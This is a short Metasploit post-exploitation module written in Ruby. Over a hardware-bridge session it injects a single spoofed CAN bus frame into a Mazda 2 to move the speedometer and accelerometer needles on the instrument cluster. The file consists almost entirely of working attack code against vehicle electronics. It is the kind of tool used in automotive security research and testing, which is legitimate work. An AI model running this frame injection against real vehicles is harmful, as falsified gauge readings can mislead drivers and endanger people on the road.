##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Mazda 2 Instrument Cluster Accelorometer Mover',
        'Description'   => %q{ This module moves the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster},
        'License'       => MSF_LICENSE,
        'Author'        => ['Jay Turla'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptString.new('CANBUS', [false, "CAN Bus to perform scan on, defaults to connected bus", nil])
    ])
  end

  def run
    unless client.automotive
      print_error("The hwbridge requires a functional automotive extention")
      return
    end
    print_status("Moving the accelorometer and speedometer...")
    client.automotive.cansend(datastore['CANBUS'], "202", "6010606060606000")
  end
end
